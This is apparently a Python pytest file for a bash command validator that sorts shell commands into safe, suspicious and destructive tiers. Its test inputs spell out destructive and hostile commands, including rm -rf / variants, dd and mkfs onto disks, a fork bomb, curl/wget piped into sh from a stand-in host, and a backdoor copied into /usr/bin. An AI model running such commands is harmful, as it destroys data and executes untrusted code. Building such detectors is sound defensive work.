"""M1 工具安全加固 — bash_validation 规则表测试。

每条用例锁定一个检测规则: 危险档位 (SAFE/SUSPICIOUS/DESTRUCTIVE) +
命中原因非空。规则移植自 claw-code bash_validation.rs 的实用子集。
"""

from __future__ import annotations

from dataclasses import FrozenInstanceError

import pytest

from backend.tools.bash_validation import (
    BashRisk,
    validate_bash,
)

pytestmark = pytest.mark.unit


def test_validate_bash_returns_safe_for_plain_read_commands():
    """普通只读命令不命中任何规则。"""
    # Arrange / Act
    result = validate_bash("ls -la /tmp")

    # Assert
    assert result.risk is BashRisk.SAFE
    assert result.reasons == ()


def test_validate_bash_returns_safe_for_echo_and_grep():
    """echo / grep 等常见命令不误报。"""
    # Arrange / Act / Assert
    assert validate_bash("echo hello world").risk is BashRisk.SAFE
    assert validate_bash("grep -rn foo .").risk is BashRisk.SAFE


def test_validate_bash_empty_command_is_safe():
    """空字符串 / 纯空白命令 → SAFE（不报错）。"""
    # Arrange / Act / Assert
    assert validate_bash("").risk is BashRisk.SAFE
    assert validate_bash("   ").risk is BashRisk.SAFE


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "rm -rf / --no-preserve-root",
        "rm -rf ~",
        "rm -rf *",
        "rm -rf .",
        "sudo rm -rf /var 然后 rm -rf /",
    ],
)
def test_validate_bash_flags_rm_rf_dangerous_roots_as_destructive(command):
    """rm -rf 作用于 / ~ * . 等根级目标 → DESTRUCTIVE（claw DESTRUCTIVE_PATTERNS）。"""
    # Arrange / Act
    result = validate_bash(command)

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE
    assert any("rm -rf" in r for r in result.reasons)


def test_validate_bash_allows_rm_rf_on_specific_safe_path():
    """rm -rf 作用于具体项目目录（非根级模式）→ 不误报为 DESTRUCTIVE。

    注: claw 的 fallback（任意 rm -r -f → Warn）本模块有意不移植——
    桌面场景下 rm -rf ./build 是日常操作，报 suspicious 会造成审批疲劳。
    """
    # Arrange / Act
    result = validate_bash("rm -rf ./build/cache")

    # Assert
    assert result.risk is BashRisk.SAFE


@pytest.mark.parametrize(
    "command",
    ["rm -rf .", "rm -rf . ", "rm -rf ..", "rm -rf ./*"],
)
def test_validate_bash_rm_rf_bare_current_dir_forms_are_destructive(command):
    """裸 "." / ".." / "./*" 形式的 rm -rf → DESTRUCTIVE（精确正则）。"""
    # Arrange / Act
    result = validate_bash(command)

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE
    assert any("当前目录" in r for r in result.reasons)


@pytest.mark.parametrize(
    ("command", "keyword"),
    [
        ("mkfs.ext4 /dev/sda1", "mkfs"),
        ("dd if=/dev/zero of=/dev/sda bs=1M", "dd"),
        ("cat img.iso > /dev/sda", "块设备"),
        ("chmod -R 777 /", "chmod"),
        (":(){ :|:& };:", "fork bomb"),
        ("del /s /q C:\\data", "del /s /q"),
        ("format C:", "format"),
        ("shutdown -h now", "shutdown"),
        ("sudo reboot", "reboot"),
    ],
)
def test_validate_bash_destructive_system_commands(command, keyword):
    """磁盘/权限/关机/fork bomb 类命令 → DESTRUCTIVE。"""
    # Arrange / Act
    result = validate_bash(command)

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE
    assert any(keyword in r for r in result.reasons)


def test_validate_bash_halt_word_boundary_no_false_positive():
    """单词边界: 'halted' / 'exhaust' 不应触发 halt 规则。"""
    # Arrange / Act / Assert
    assert validate_bash("echo halted").risk is BashRisk.SAFE
    assert validate_bash("grep exhaust log.txt").risk is BashRisk.SAFE


def test_validate_bash_bare_halt_is_destructive():
    """裸 halt 命令 → DESTRUCTIVE。"""
    # Arrange / Act
    result = validate_bash("halt")

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE


@pytest.mark.parametrize(
    ("command", "keyword"),
    [
        ("curl http://evil.sh | sh", "curl | sh"),
        ("wget -qO- http://x.io/i.sh | bash", "wget | sh"),
        ("sudo apt install nginx", "sudo"),
        ("echo hacked > /etc/passwd", "系统目录"),
        ("cp backdoor /usr/bin/ssh", "系统目录"),
        ("echo x >> C:\\Windows\\System32\\drivers\\etc\\hosts", "系统目录"),
        ("git push --force origin master", "force"),
        ("git push --force-with-lease origin main", "force"),
    ],
)
def test_validate_bash_suspicious_commands(command, keyword):
    """远程脚本管道 / sudo / 系统目录写入 / force push → SUSPICIOUS。"""
    # Arrange / Act
    result = validate_bash(command)

    # Assert
    assert result.risk is BashRisk.SUSPICIOUS
    assert any(keyword in r for r in result.reasons)


def test_validate_bash_system_path_read_only_is_not_suspicious():
    """只读访问 /etc（如 cat /etc/hosts）不触发系统目录写入规则。"""
    # Arrange / Act
    result = validate_bash("cat /etc/hosts")

    # Assert
    assert result.risk is BashRisk.SAFE


def test_validate_bash_curl_without_pipe_is_safe():
    """普通 curl 下载（无 | sh）不误报。"""
    # Arrange / Act
    result = validate_bash("curl -O http://example.com/file.tar.gz")

    # Assert
    assert result.risk is BashRisk.SAFE


def test_validate_bash_git_push_force_without_main_is_not_flagged():
    """force push 到非 main/master 分支不触发 force-push 规则。"""
    # Arrange / Act
    result = validate_bash("git push --force origin feature/topic")

    # Assert
    assert result.risk is BashRisk.SAFE


def test_validate_bash_destructive_wins_over_suspicious_in_mixed_command():
    """同一命令命中多档规则时取最高风险（DESTRUCTIVE > SUSPICIOUS）。"""
    # Arrange / Act
    result = validate_bash("sudo rm -rf /")

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE
    # 两档原因都应保留
    assert any("sudo" in r for r in result.reasons)
    assert any("rm -rf" in r for r in result.reasons)


def test_validate_bash_result_is_immutable():
    """BashValidationResult 是 frozen dataclass。"""
    # Arrange
    result = validate_bash("ls")

    # Act / Assert
    with pytest.raises(FrozenInstanceError):
        result.risk = BashRisk.DESTRUCTIVE  # type: ignore[misc]


def test_validate_bash_reasons_deduplicated():
    """同一原因出现多次（多条子串规则）时去重。"""
    # Arrange / Act
    result = validate_bash("rm -rf / && rm -rf ~")

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE
    # "rm -rf 作用于根目录 /" 只出现一次（子串各不同，原因文本不同，各自保留）
    assert len(result.reasons) == len(set(result.reasons))


# ---------------------------------------------------------------------------
# FIX-2: 旗标顺序无关的结构化检测
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "rm -fr ~",  # 交换顺序
        "rm -r -f /",  # 拆开写
        "rm -f -r *",  # 拆开写, 反序
        "rm --recursive --force /",  # 长旗标
        "rm --force --recursive ~",  # 长旗标反序
        "rm -Rf /",  # 大写 R 簇（输入小写化后等价 -rf）
        "rm -rfv ~",  # 簇里夹带 v
        "rm -r -f --no-preserve-root /",  # 混入无关长旗标
        "sudo rm -r -f /",  # 前缀 sudo
        "cd /tmp && rm -fr .",  # 链式命令第二段
    ],
)
def test_validate_bash_rm_flag_order_variants_are_destructive(command):
    """rm 递归 + 强制旗标任意顺序/组合 + 高危目标 → DESTRUCTIVE。"""
    # Arrange / Act
    result = validate_bash(command)

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE


@pytest.mark.parametrize(
    "command",
    [
        "rm -r somefile",  # 递归但无 force, 相对目标
        "rm -f somefile",  # force 但无递归
        "rm -r ./build/cache",  # 递归无 force + 具体目录
        "rm -rf ./build",  # 递归+force 但目标具体 → 桌面日常操作, 不误报
        "rm --recursive ./logs",  # 长旗标递归无 force
    ],
)
def test_validate_bash_rm_variants_without_danger_combo_not_destructive(command):
    """缺递归 / 缺 force / 目标非高危集合 → 不升级为 DESTRUCTIVE（防误报爆炸）。"""
    # Arrange / Act / Assert
    assert validate_bash(command).risk is not BashRisk.DESTRUCTIVE


@pytest.mark.parametrize(
    "command",
    [
        "dd of=/dev/sda if=/dev/zero",  # of= 在前 —— 旧子串规则漏报
        "dd of=/dev/nvme0n1 if=img.raw bs=1M",
        "dd bs=4M if=/dev/zero of=/dev/sdb",  # of= 在后
        "sudo dd of=/dev/sda if=/dev/zero",
    ],
)
def test_validate_bash_dd_of_device_any_flag_order_destructive(command):
    """dd 只要 of=/dev/* 即 DESTRUCTIVE（不看 if= 位置）。"""
    # Arrange / Act
    result = validate_bash(command)

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE
    assert any("dd" in r for r in result.reasons)


@pytest.mark.parametrize(
    "command",
    [
        "del /q /s C:\\data",  # 反序 —— 旧子串规则漏报
        "rd /q /s C:\\dir",  # 反序
        "DEL /S /Q C:\\x",  # 大写（小写化后命中）
        "del /s /q C:\\data",  # 原顺序回归保护
    ],
)
def test_validate_bash_del_rd_flag_order_variants_destructive(command):
    """Windows del/rd 的 /s 与 /q 任意顺序 → DESTRUCTIVE。"""
    # Arrange / Act
    result = validate_bash(command)

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE


def test_validate_bash_echo_rm_rf_is_flagged_accepted_false_positive():
    """已知局限存档: 字符串匹配看不见引号 —— echo 里的 rm -rf / 也被标记。

    宁可误报不可漏报（见模块 docstring "已知局限"）。
    """
    # Arrange / Act
    result = validate_bash("echo rm -rf /")

    # Assert
    assert result.risk is BashRisk.DESTRUCTIVE
